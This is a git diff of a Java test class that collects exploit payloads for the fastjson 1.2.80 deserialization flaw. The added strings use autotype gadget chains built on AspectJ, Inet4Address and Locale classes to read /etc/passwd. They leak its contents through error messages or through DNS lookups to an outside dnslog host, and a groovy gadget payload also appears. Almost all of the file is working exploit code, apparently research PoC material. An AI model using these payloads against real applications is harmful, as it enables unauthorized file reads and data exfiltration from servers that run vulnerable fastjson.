@@ -30,6 +30,7 @@ public class fastjson_1_2_80_jdk11 {
                 "        }\n" +
                 "    }";
 
+        // 回显
         String payload3 = "{\n" +
                 "    \"x\":{\n" +
                 "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
@@ -37,6 +38,51 @@ public class fastjson_1_2_80_jdk11 {
                 "        \"fileName\":\"/etc/passwd\"\n" +
                 "    }\n" +
                 "}";
+
+        //报错回显
+        payload3 = "{\n" +
+                "  \"@type\": \"java.lang.Character\" {\n" +
+                "    \"C\": {\n" +
+                "      \"x\": {\n" +
+                "        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
+                "        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
+                "        \"fileName\": \"/etc/passwd\"\n" +
+                "      }\n" +
+                "    }\n" +
+                "  }\n" +
+                "}";
+
+        // dnslog
+        payload3 = "{\r\n"
+                + "    \"@type\":\"java.net.Inet4Address\",\r\n"
+                + "    \"val\":{\r\n"
+                + "        \"@type\":\"java.lang.String\"{\r\n"
+                + "        \"@type\":\"java.util.Locale\",\r\n"
+                + "        \"val\":{\r\n"
+                + "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\r\n"
+                + "                \"@type\":\"java.lang.String\"\r\n"
+                + "                \"@type\":\"java.util.Locale\",\r\n"
+                + "                \"country\":\"abc.dnslog.pw\",\r\n"
+                + "                \"language\":{\r\n"
+                + "                    \"@type\":\"java.lang.String\"{\r\n"
+                + "                    \"x\":{\r\n"
+                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
+                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
+                + "				\"fileName\": \"/etc/passwd\"\r\n"
+                + "			}\r\n"
+                + "                }\r\n"
+                + "            }\r\n"
+                + "        }\r\n"
+                + "    }\r\n"
+                + "  }\r\n"
+                + "}\r\n"
+                + "}\r\n"
+                + "\r\n"
+                + "\r\n"
+                + "\r\n"
+                + "";
+
+
         JSON.parseObject(payload1);
         try {
             JSON.parseObject(payload2);
@@ -46,7 +92,7 @@ public class fastjson_1_2_80_jdk11 {
     }
 
     @Test
-    public void groovy(){
+    public void groovy() {
         String payload1 = "{\n" +
                 "    \"@type\":\"java.lang.Exception\",\n" +
                 "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
@@ -66,14 +112,5 @@ public class fastjson_1_2_80_jdk11 {
         } catch (Exception e) {
         }
         JSON.parse(payload2);
-    }
-
-    @Test
-    public void groovy2(){
-        String payload = "{\"a\":{\"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
-                "\"fileName\":\"/etc/passwd\"},\"b\":\n" +
-                "{\"@type\":\"java.net.Inet4Address\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\", \"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\": \"java.lang.String\"\"@type\":\"java.util.Locale\", \"language\":{\"@type\":\"java.lang.String\"{\"$ref\":\"$\"},\"country\":\"ppp.dnslog.pw\"}}}}}";
-        Object jsonObject = JSON.parseObject(payload);
-        System.out.println(jsonObject.toString());
     }
 }
